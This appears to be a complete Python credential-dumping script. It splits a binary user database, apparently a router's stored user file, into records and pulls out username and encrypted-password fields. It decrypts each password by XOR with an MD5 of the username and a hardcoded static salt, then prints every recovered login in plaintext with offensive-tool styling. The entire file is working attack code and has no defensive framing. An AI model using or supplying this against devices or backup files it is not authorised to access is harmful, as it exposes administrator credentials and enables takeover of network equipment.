import hashlib

import rich


def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b'283i4jfkai3389').digest()

    passw = ''
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])

    return passw.split('\x00')[0]


def extract_user_pass_from_entry(entry):
    user_data = entry.split(b'\x01\x00\x00\x21')[1]
    pass_data = entry.split(b'\x11\x00\x00\x21')[1]

    user_len = user_data[0]
    pass_len = pass_data[0]

    username = user_data[1 : 1 + user_len]
    password = pass_data[1 : 1 + pass_len]

    return username, password


def dump(data):
    entries = data.split(b'M2')[1:]
    count = 0
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
        except:
            continue

        pass_plain = decrypt_password(user, pass_encrypted)
        user = user.decode('ascii')

        rich.print(
            '[bold white][[/bold white]'
            '[bold green]+[/bold green]'
            '[bold white]][/bold white]'
            '[bold green] Username:[/bold green]',
            end=' ',
        )

        print(user, end=' ')

        rich.print('[bold green]Password:[/bold green]', end=' ')
        print(pass_plain)

        count += 1

    rich.print(
        '\n[bold green][[/bold green]'
        '[bold yellow]*[/bold yellow]'
        '[bold green]][/bold green]'
        '[bold green] Search completed with [/bold green]'
        f'[bold white]{count}[/bold white]'
        '[bold green] results[/bold green]'
    )
